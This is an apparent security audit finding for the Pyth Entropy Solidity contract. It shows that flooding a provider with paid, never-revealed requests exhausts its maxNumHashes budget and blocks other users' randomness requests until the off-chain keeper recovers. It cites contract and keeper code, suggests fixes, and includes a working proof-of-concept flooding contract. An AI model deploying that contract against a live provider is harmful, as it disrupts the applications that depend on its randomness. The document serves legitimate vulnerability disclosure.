### Title
Entropy Provider DoS via Unrevealed Request Flooding Exhausts `maxNumHashes` Budget — (`File: target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

### Summary

An unprivileged Entropy user can permanently block new randomness requests to any provider by flooding the provider with paid requests that are never revealed. Because `numHashes` grows with each unrevealed request and is bounded by `maxNumHashes`, once the budget is exhausted every subsequent `request()` / `requestV2()` call reverts with `LastRevealedTooOld`. The only recovery path requires the provider's off-chain Fortuna keeper to call `advanceProviderCommitment`, creating a sustained, repeatable DoS window.

---

### Finding Description

Every call to `requestHelper` computes:

```solidity
req.numHashes = SafeCast.toUint32(
    assignedSequenceNumber -
        providerInfo.currentCommitmentSequenceNumber
);
if (
    providerInfo.maxNumHashes != 0 &&
    req.numHashes > providerInfo.maxNumHashes
) {
    revert EntropyErrors.LastRevealedTooOld();
}
``` [1](#0-0) 

`numHashes` equals the distance between the current request's sequence number and `currentCommitmentSequenceNumber`. `currentCommitmentSequenceNumber` only advances when a reveal is processed or when `advanceProviderCommitment` is called. There is **no minimum request amount** beyond the provider fee, and **no rate-limiting** on how many requests a single address can submit.

An attacker therefore:
1. Calls `request()` (or `requestV2()`) exactly `maxNumHashes` times, paying the fee each time, but **never calls `reveal` / `revealWithCallback`**.
2. `providerInfo.sequenceNumber` increments with each call while `currentCommitmentSequenceNumber` stays fixed.
3. The gap `assignedSequenceNumber − currentCommitmentSequenceNumber` now equals `maxNumHashes` for every subsequent legitimate request, causing them all to revert. [2](#0-1) 

The only on-chain recovery is `advanceProviderCommitment`, which is `public` but cryptographically gated — it requires the provider's secret hash-chain value:

```solidity
if (providerCommitment != providerInfo.currentCommitment)
    revert EntropyErrors.IncorrectRevelation();
``` [3](#0-2) 

Only the Fortuna keeper (off-chain) holds these values. The keeper polls every `UPDATE_COMMITMENTS_INTERVAL = 30 seconds` and only acts when `outstanding_requests > threshold (0.95 × maxNumHashes)`: [4](#0-3) [5](#0-4) 

The keeper itself acknowledges this as a possible DoS vector in a warning log. Between the moment the attacker exhausts the budget and the moment the keeper responds (up to 30 s), **all new randomness requests to that provider fail**. An attacker who continuously submits new requests at a rate faster than the keeper's polling interval can sustain the DoS indefinitely.

---

### Impact Explanation

- All `request()` / `requestWithCallback()` / `requestV2()` calls to the targeted provider revert with `LastRevealedTooOld` for the duration of the attack.
- Any on-chain consumer (NFT mint, lottery, game) that depends on Entropy from the targeted provider is blocked.
- The default provider (`_state.defaultProvider`) is the most impactful target because `requestV2()` with no provider argument routes to it automatically. [6](#0-5) 

Impact: **3 / 5** — temporary but repeatable service disruption for all consumers of the targeted provider.

---

### Likelihood Explanation

- Entry path is fully permissionless: any EOA can call `request()` with `msg.value >= getFee(provider)`.
- No special knowledge or role is required.
- Attack cost = `maxNumHashes × feeInWei`. For a provider with `maxNumHashes = 1 000` and `feeInWei = 1e15` (0.001 ETH), the cost per 30-second DoS window is ~1 ETH — economically viable for a motivated attacker.
- The Fortuna keeper's 30-second polling interval creates a guaranteed window per attack cycle.

Likelihood: **3 / 5**

---

### Recommendation

1. **On-chain rate limiting**: Track per-address request counts within a rolling window and revert if a single address exceeds a configurable threshold.
2. **Minimum fee floor tied to `maxNumHashes`**: Require `msg.value` to cover at least a fraction of the cost of an `advanceProviderCommitment` call, making bulk flooding economically self-defeating.
3. **Reduce keeper polling interval** or trigger `advanceProviderCommitment` reactively (event-driven) rather than on a fixed timer.
4. **Expose an admin pause** on a per-provider basis so the Pyth admin can temporarily halt requests to a targeted provider while the keeper recovers.

---

### Proof of Concept

```solidity
// Attacker contract
contract EntropyDoS {
    IEntropy entropy;
    address provider;

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    // Call this once to exhaust the provider's maxNumHashes budget
    function flood(uint32 maxNumHashes) external payable {
        uint128 fee = entropy.getFee(provider);
        require(msg.value >= fee * maxNumHashes, "insufficient ETH");
        for (uint32 i = 0; i < maxNumHashes; i++) {
            // Pay fee, never reveal — numHashes grows, currentCommitmentSequenceNumber stays fixed
            entropy.request{value: fee}(
                provider,
                keccak256(abi.encodePacked(i, block.timestamp)),
                false
            );
        }
        // From this point, any new request to `provider` reverts with LastRevealedTooOld
        // until the Fortuna keeper calls advanceProviderCommitment (up to 30 s later)
    }
}
```

After `flood()` completes, any call to `entropy.request(provider, ...)` reverts with `LastRevealedTooOld` until the Fortuna keeper's `update_commitments_if_necessary` fires and successfully lands `advanceProviderCommitment` on-chain. [7](#0-6) [8](#0-7)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L228-231)
```text
        uint64 assignedSequenceNumber = providerInfo.sequenceNumber;
        if (assignedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.OutOfRandomness();
        providerInfo.sequenceNumber += 1;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L247-256)
```text
        req.numHashes = SafeCast.toUint32(
            assignedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        if (
            providerInfo.maxNumHashes != 0 &&
            req.numHashes > providerInfo.maxNumHashes
        ) {
            revert EntropyErrors.LastRevealedTooOld();
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L286-293)
```text
    function requestV2()
        external
        payable
        override
        returns (uint64 assignedSequenceNumber)
    {
        assignedSequenceNumber = requestV2(getDefaultProvider(), random(), 0);
    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L443-484)
```text
    function advanceProviderCommitment(
        address provider,
        uint64 advancedSequenceNumber,
        bytes32 providerContribution
    ) public override {
        EntropyStructsV2.ProviderInfo storage providerInfo = _state.providers[
            provider
        ];
        if (
            advancedSequenceNumber <=
            providerInfo.currentCommitmentSequenceNumber
        ) revert EntropyErrors.UpdateTooOld();
        if (advancedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.AssertionFailure();

        uint32 numHashes = SafeCast.toUint32(
            advancedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        bytes32 providerCommitment = constructProviderCommitment(
            numHashes,
            providerContribution
        );

        if (providerCommitment != providerInfo.currentCommitment)
            revert EntropyErrors.IncorrectRevelation();

        providerInfo.currentCommitmentSequenceNumber = advancedSequenceNumber;
        providerInfo.currentCommitment = providerContribution;
        if (
            providerInfo.currentCommitmentSequenceNumber >=
            providerInfo.sequenceNumber
        ) {
            // This means the provider called the function with a sequence number that was not yet requested.
            // Providers should never do this and we consider such an implementation flawed.
            // Assuming this is landed on-chain it's better to bump the sequence number and never use that range
            // for future requests. Otherwise, someone can use the leaked revelation to derive favorable random numbers.
            providerInfo.sequenceNumber =
                providerInfo.currentCommitmentSequenceNumber +
                1;
        }
    }
```

**File:** apps/fortuna/src/keeper/commitment.rs (L14-15)
```rust
const UPDATE_COMMITMENTS_INTERVAL: Duration = Duration::from_secs(30);
const UPDATE_COMMITMENTS_THRESHOLD_FACTOR: f64 = 0.95;
```

**File:** apps/fortuna/src/keeper/commitment.rs (L33-71)
```rust
pub async fn update_commitments_if_necessary(
    contract: Arc<InstrumentedSignablePythContract>,
    chain_state: &BlockchainState,
) -> Result<()> {
    //TODO: we can reuse the result from the last call from the watch_blocks thread to reduce RPCs
    let latest_safe_block = get_latest_safe_block(chain_state).in_current_span().await;
    let provider_address = chain_state.provider_address;
    let provider_info = contract
        .get_provider_info_v2(provider_address)
        .block(latest_safe_block) // To ensure we are not revealing sooner than we should
        .call()
        .await
        .map_err(|e| {
            anyhow!(
                "Error while getting provider info at block {}. error: {:?}",
                latest_safe_block,
                e
            )
        })?;
    if provider_info.max_num_hashes == 0 {
        return Ok(());
    }
    let threshold =
        ((provider_info.max_num_hashes as f64) * UPDATE_COMMITMENTS_THRESHOLD_FACTOR) as u64;
    let outstanding_requests =
        provider_info.sequence_number - provider_info.current_commitment_sequence_number;
    if outstanding_requests > threshold {
        // NOTE: This log message triggers a grafana alert. If you want to change the text, please change the alert also.
        tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack. Number of outstanding requests: {:?} Threshold: {:?}", outstanding_requests, threshold);
        let seq_number = provider_info.sequence_number - 1;
        let provider_revelation = chain_state
            .state
            .reveal(seq_number)
            .map_err(|e| anyhow!("Error revealing: {:?}", e))?;
        let contract_call =
            contract.advance_provider_commitment(provider_address, seq_number, provider_revelation);
        send_and_confirm(contract_call).await?;
    }
    Ok(())
```
